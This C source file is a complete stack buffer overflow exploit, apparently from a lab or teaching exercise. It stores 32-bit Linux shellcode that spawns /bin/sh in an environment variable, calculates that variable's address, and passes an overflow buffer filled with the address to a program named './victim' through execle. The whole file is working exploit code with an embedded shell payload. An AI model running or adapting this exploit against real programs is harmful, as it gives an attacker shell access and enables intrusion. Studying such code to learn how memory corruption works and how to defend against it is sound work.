#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define DEFAULT_BUFFER_SIZE     240

const char TARGET_PATH[] = "./victim";
const char TARGET[] = "victim";
char SHELLCODE[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
                   "\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd"
                   "\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

void env_exploit(unsigned int buf_size);

int main(int argc, char *argv[]) {
    int buf_size = DEFAULT_BUFFER_SIZE;

    if(argc > 1) buf_size = atoi(argv[1]);

    env_exploit(buf_size);
}

/* 
 * This function uses the execle function to execute the TARGET program.
 * An environment variable is passed into the execle function containing
 * our shellcode. The address of this environment variable is then calculated
 * and stored repeatedly in a buffer of size buf_size, which is also
 * passed to excele as a command line argument for TARGET.
*/
void env_exploit(unsigned int buf_size) {
    char *env[2] = {SHELLCODE, 0};
    unsigned int i, ret;
    char *buffer = (char *)malloc(buf_size);

    // excele does not inherit parents environment variables,
    // we can use this fact to calculate the offset from the
    // starting address 0xbffffffa to our shellcode, this will
    // give us the address of the shellcode we want to execute
    ret = 0xbffffffa - (sizeof(SHELLCODE) - 1) - strlen(TARGET_PATH);
    // Fill buffer with repetitions of the shellcode address
    for(i = 0; i < buf_size; i += 4)
        *((unsigned int *)(buffer + i)) = ret;

    // Execute TARGET program
    execle(TARGET_PATH, TARGET, buffer, 0, env);
    free(buffer);
}

